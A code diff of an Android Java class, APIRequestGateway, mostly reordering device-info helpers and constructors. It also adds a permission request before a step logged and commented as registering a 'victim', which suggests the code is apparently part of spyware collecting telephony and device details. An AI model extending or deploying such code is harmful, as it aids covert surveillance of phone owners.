@@ -5,12 +5,6 @@ import android.content.Context;
 import android.content.SharedPreferences;
 import android.os.Build;
 import android.support.annotation.NonNull;
-import android.telephony.CellInfo;
-import android.telephony.CellInfoCdma;
-import android.telephony.CellInfoGsm;
-import android.telephony.CellInfoLte;
-import android.telephony.CellInfoWcdma;
-import android.telephony.NeighboringCellInfo;
 import android.telephony.TelephonyManager;
 import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
@@ -37,7 +31,25 @@ public class APIRequestGateway {
 
     private static final String X = APIRequestGateway.class.getSimpleName();
     private final Activity activity;
+    private final Context context;
+    @NonNull
+    private final APIRequestGatewayCallback callback;
     private TelephonyManager tm;
+
+    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
+        this.context = context;
+        this.activity = activity;
+        this.callback = callback;
+        execute();
+    }
+
+    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
+        this(activity.getBaseContext(), activity, callback);
+    }
+
+    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
+        this(context, null, callback);
+    }
 
     private static String getDeviceName() {
         final String manufacturer = Build.MANUFACTURER;
@@ -49,47 +61,56 @@ public class APIRequestGateway {
         }
     }
 
-
-    public static class DeviceInfoBuilder {
-
-        private static final String HOT_REGEX = "[,=]";
-        public StringBuilder stringBuilder = new StringBuilder();
-
-        public DeviceInfoBuilder put(final String key, final String value) {
-            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value)).append(",");
-            return this;
+    private static String getPhoneType(int phoneType) {
+        switch (phoneType) {
+            case TelephonyManager.PHONE_TYPE_NONE:
+                return "TYPE_NONE";
+            case TelephonyManager.PHONE_TYPE_GSM:
+                return "TYPE_GSM";
+            case TelephonyManager.PHONE_TYPE_CDMA:
+                return "TYPE_CDMA";
+            case TelephonyManager.PHONE_TYPE_SIP:
+                return "TYPE_SIP";
+            default:
+                return "TYPE_VERY_NONE";
         }
+    }
 
-        public DeviceInfoBuilder put(final String key, final int value) {
-            return put(key, String.valueOf(value));
+    private static String getNetworkType(int dataNetworkType) {
+        switch (dataNetworkType) {
+            case TelephonyManager.NETWORK_TYPE_GPRS:
+                return "TYPE_GPRS";
+            case TelephonyManager.NETWORK_TYPE_EDGE:
+                return "TYPE_EDGE";
+            case TelephonyManager.NETWORK_TYPE_UMTS:
+                return "TYPE_UMTS";
+            case TelephonyManager.NETWORK_TYPE_HSDPA:
+                return "TYPE_HSDPA";
+            case TelephonyManager.NETWORK_TYPE_HSUPA:
+                return "TYPE_HSUPA";
+            case TelephonyManager.NETWORK_TYPE_HSPA:
+                return "HSPA";
+            case TelephonyManager.NETWORK_TYPE_CDMA:
+                return "TYPE_CDMA";
+            case TelephonyManager.NETWORK_TYPE_EVDO_0:
+                return "TYPE_EVDO_0";
+            case TelephonyManager.NETWORK_TYPE_EVDO_A:
+                return "TYPE_EVDO_A";
+            case TelephonyManager.NETWORK_TYPE_EVDO_B:
+                return "TYPE_EVDO_B";
+            case TelephonyManager.NETWORK_TYPE_1xRTT:
+                return "TYPE_1xRTT";
+            case TelephonyManager.NETWORK_TYPE_IDEN:
+                return "TYPE_IDEN";
+            case TelephonyManager.NETWORK_TYPE_LTE:
+                return "TYPE_LTE";
+            case TelephonyManager.NETWORK_TYPE_EHRPD:
+                return "TYPE_EHRPD";
+            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
+                return "TYPE_UNKNOWN";
+            default:
+                return "TYPE_VERY_UNKNOWN";
         }
-
-        public DeviceInfoBuilder put(final String key, final long value) {
-            return put(key, String.valueOf(value));
-        }
-
-        public DeviceInfoBuilder put(final String key, final boolean value) {
-            return put(key, String.valueOf(value));
-        }
-
-        private static String getCooledValue(String value) {
-            if (value == null || value.isEmpty()) {
-                return "-";
-            }
-            return value.replaceAll(HOT_REGEX, "~");
-        }
-
-        public DeviceInfoBuilder putLastInfo(final String key, final String value) {
-            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value));
-            return this;
-        }
-
-        @Override
-        public String toString() {
-            return stringBuilder.toString();
-        }
-
-
     }
 
     private String getDeviceInfoDynamic() {
@@ -209,84 +230,6 @@ public class APIRequestGateway {
 
         return deviceInfoBuilder.toString();
     }
-
-    private static String getPhoneType(int phoneType) {
-        switch (phoneType) {
-            case TelephonyManager.PHONE_TYPE_NONE:
-                return "TYPE_NONE";
-            case TelephonyManager.PHONE_TYPE_GSM:
-                return "TYPE_GSM";
-            case TelephonyManager.PHONE_TYPE_CDMA:
-                return "TYPE_CDMA";
-            case TelephonyManager.PHONE_TYPE_SIP:
-                return "TYPE_SIP";
-            default:
-                return "TYPE_VERY_NONE";
-        }
-    }
-
-    private static String getNetworkType(int dataNetworkType) {
-        switch (dataNetworkType) {
-            case TelephonyManager.NETWORK_TYPE_GPRS:
-                return "TYPE_GPRS";
-            case TelephonyManager.NETWORK_TYPE_EDGE:
-                return "TYPE_EDGE";
-            case TelephonyManager.NETWORK_TYPE_UMTS:
-                return "TYPE_UMTS";
-            case TelephonyManager.NETWORK_TYPE_HSDPA:
-                return "TYPE_HSDPA";
-            case TelephonyManager.NETWORK_TYPE_HSUPA:
-                return "TYPE_HSUPA";
-            case TelephonyManager.NETWORK_TYPE_HSPA:
-                return "HSPA";
-            case TelephonyManager.NETWORK_TYPE_CDMA:
-                return "TYPE_CDMA";
-            case TelephonyManager.NETWORK_TYPE_EVDO_0:
-                return "TYPE_EVDO_0";
-            case TelephonyManager.NETWORK_TYPE_EVDO_A:
-                return "TYPE_EVDO_A";
-            case TelephonyManager.NETWORK_TYPE_EVDO_B:
-                return "TYPE_EVDO_B";
-            case TelephonyManager.NETWORK_TYPE_1xRTT:
-                return "TYPE_1xRTT";
-            case TelephonyManager.NETWORK_TYPE_IDEN:
-                return "TYPE_IDEN";
-            case TelephonyManager.NETWORK_TYPE_LTE:
-                return "TYPE_LTE";
-            case TelephonyManager.NETWORK_TYPE_EHRPD:
-                return "TYPE_EHRPD";
-            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
-                return "TYPE_UNKNOWN";
-            default:
-                return "TYPE_VERY_UNKNOWN";
-        }
-    }
-
-    public interface APIRequestGatewayCallback {
-        void onReadyToRequest(final String apiKey);
-
-        void onFailed(final String reason);
-    }
-
-    private final Context context;
-    @NonNull
-    private final APIRequestGatewayCallback callback;
-
-    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
-        this.context = context;
-        this.activity = activity;
-        this.callback = callback;
-        execute();
-    }
-
-    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
-        this(activity.getBaseContext(), activity, callback);
-    }
-
-    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
-        this(context, null, callback);
-    }
-
 
     private void register(final Context context) {
 
@@ -416,7 +359,17 @@ public class APIRequestGateway {
                 Log.i(X, "Registering victim...");
 
                 //Register victim here
-                register(context);
+                new PermissionUtils(context, new PermissionUtils.Callback() {
+                    @Override
+                    public void onAllPermissionGranted() {
+                        register(context);
+                    }
+
+                    @Override
+                    public void onPermissionDenial() {
+                        Log.e(X, "Permission not granted");
+                    }
+                }, null).begin();
             }
 
         } else {
@@ -435,5 +388,54 @@ public class APIRequestGateway {
             Log.e(X, "Doesn't have APIKEY and no network!");
 
         }
+    }
+
+
+    public interface APIRequestGatewayCallback {
+        void onReadyToRequest(final String apiKey);
+
+        void onFailed(final String reason);
+    }
+
+    public static class DeviceInfoBuilder {
+
+        private static final String HOT_REGEX = "[,=]";
+        public StringBuilder stringBuilder = new StringBuilder();
+
+        private static String getCooledValue(String value) {
+            if (value == null || value.isEmpty()) {
+                return "-";
+            }
+            return value.replaceAll(HOT_REGEX, "~");
+        }
+
+        public DeviceInfoBuilder put(final String key, final String value) {
+            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value)).append(",");
+            return this;
+        }
+
+        public DeviceInfoBuilder put(final String key, final int value) {
+            return put(key, String.valueOf(value));
+        }
+
+        public DeviceInfoBuilder put(final String key, final long value) {
+            return put(key, String.valueOf(value));
+        }
+
+        public DeviceInfoBuilder put(final String key, final boolean value) {
+            return put(key, String.valueOf(value));
+        }
+
+        public DeviceInfoBuilder putLastInfo(final String key, final String value) {
+            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value));
+            return this;
+        }
+
+        @Override
+        public String toString() {
+            return stringBuilder.toString();
+        }
+
+
     }
 }
